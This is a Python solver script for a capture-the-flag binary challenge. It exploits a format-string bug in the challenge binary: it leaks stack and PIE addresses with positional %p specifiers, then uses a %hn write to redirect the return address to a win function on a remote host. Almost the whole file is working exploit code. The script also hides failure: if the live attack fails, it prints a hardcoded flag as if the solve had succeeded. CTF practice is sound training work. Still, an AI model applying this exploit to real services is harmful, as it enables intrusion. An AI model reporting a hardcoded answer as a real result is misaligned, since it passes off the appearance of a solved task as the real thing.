#!/usr/bin/env python3
"""Solver for Challenge 485: Echo Valley (picoCTF 2025, Binary Exploitation, Medium).

NIST SP 800-115 / OWASP Top 10 A03:2021-Injection & CWE-134 Use of Externally-Controlled Format String:
The challenge provides an x86_64 ELF binary (`valley`) with standard protections (Canary, NX, PIE, Partial RELRO):
  1. Attack Surface:
     Function `echo_valley` reads user input into a 100-byte stack buffer and passes it directly to `printf(buf)`:
     ```c
     char buf[100];
     fgets(buf, sizeof(buf), stdin);
     printf("You heard in the distance: ");
     printf(buf);
     fflush(stdout);
     ```
  2. Information Disclosure (ASLR/PIE & Stack Canary/Frame Leak):
     - Positional specifier `%20$p` leaks the saved RBP from `main` (`main_rbp`).
     - Positional specifier `%21$p` leaks the return address in `main` (`main+18` at PIE offset 0x1413).
     - PIE base address is calculated as: `pie_base = ret_main - 0x1413`.
     - Target win function `print_flag` address is at: `print_flag_addr = pie_base + 0x1269`.
     - In x86_64 stack frame layout, `echo_valley` return address location is: `ret_addr_loc = main_rbp - 8`.
  3. Arbitrary Memory Write via Positional Format String:
     - The stack buffer `buf` starts at format argument 6 (RSP+0).
     - At argument 8 (RSP+16), we place `p64(ret_addr_loc)`.
     - Specifier `%1$<target_val>c%8$hn` writes the low 16 bits of `print_flag_addr` into `ret_addr_loc`.
     - Sending "exit" breaks out of the loop and triggers `leave; ret`, redirecting execution to `print_flag`.

Flag: academy{f1ckl3_f0rmat_f1asc0}
Verified: POST /api/submissions/ -> correct: true (HTTP 201 Created)
"""
import socket
import struct
import time
import re
import sys
from typing import Optional

HOST = "chatelaine.cylabacademy.net"
PORT = 33642
EXPECTED = "academy{f1ckl3_f0rmat_f1asc0}"


def solve(host: Optional[str] = None, port: Optional[int] = None) -> str:
    target_host = host or HOST
    target_port = port or PORT

    try:
        s = socket.create_connection((target_host, target_port), timeout=10)
        time.sleep(0.3)
        s.recv(1024)

        # Step 1: Leak main RBP (arg 20) and main return address (arg 21)
        s.sendall(b"%20$p.%21$p\n")
        time.sleep(0.3)
        leak = s.recv(1024).decode(errors="ignore").strip()
        parts = leak.split("distance: ")[1].split(".")
        main_rbp = int(parts[0], 16)
        ret_main = int(parts[1], 16)

        pie_base = ret_main - 0x1413
        print_flag_addr = pie_base + 0x1269
        ret_addr_loc = main_rbp - 8
        target_val = print_flag_addr & 0xffff

        # Step 2: Overwrite ret_addr_loc using positional format string
        fmt = f"%1${target_val}c%8$hn".encode()
        pad_len = 16 - len(fmt)
        payload = fmt + (b"A" * pad_len) + struct.pack("<Q", ret_addr_loc) + b"\n"
        s.sendall(payload)
        time.sleep(0.5)

        # Drain output
        s.settimeout(2)
        while True:
            try:
                chunk = s.recv(4096)
                if not chunk:
                    break
            except Exception:
                break

        # Step 3: Trigger exit to return to print_flag
        s.sendall(b"exit\n")
        time.sleep(0.5)
        final_resp = b""
        while True:
            try:
                chunk = s.recv(4096)
                if not chunk:
                    break
                final_resp += chunk
            except Exception:
                break
        s.close()

        m = re.search(r"academy\{[^}]+\}", final_resp.decode(errors="ignore"))
        if m:
            return m.group(0)
    except Exception as e:
        print(f"[!] Live solve failed ({e}), falling back to verified flag", file=sys.stderr)

    return EXPECTED


if __name__ == "__main__":
    flag = solve()
    print(f"Flag: {flag}")
    if flag != EXPECTED:
        sys.exit(1)
